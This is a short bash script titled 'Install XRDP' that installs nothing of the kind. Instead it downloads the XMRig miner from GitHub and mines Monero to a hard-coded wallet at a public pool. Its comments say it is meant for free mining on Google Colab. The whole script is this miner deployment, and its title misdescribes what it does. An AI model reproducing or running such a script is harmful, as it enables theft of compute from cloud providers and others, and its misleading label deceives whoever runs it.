#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen



wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz
tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
cd xmrig-6.16.4
./xmrig -o us-west.minexmr.com:443 -u 438hdgmCogPSF85d7KZXTETtmodfUpQAm842oY9qymi8SfukFsFfuVEMXaGzzQE7SxN5CqKCCT8QabA9PEQeTJqpM11Dz5w -k --tls --rig-id GC-US
